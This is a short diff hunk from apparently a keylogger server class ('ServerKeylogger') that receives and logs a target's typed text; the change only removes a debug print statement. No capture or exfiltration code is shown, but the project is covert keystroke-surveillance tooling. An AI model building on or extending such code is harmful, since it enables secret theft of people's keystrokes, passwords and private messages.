@@ -26,8 +26,7 @@ class ServerKeylogger:
 
         if self.check_under is False:
             self.new_data = real_data
-
-        print(self.check_under)
+            
         # The data is being stored in full_msg
         bp.color(f"Text of target: {self.new_data}", "magenta")
         zeit = time.strftime("%H-%M-%S-%Y")
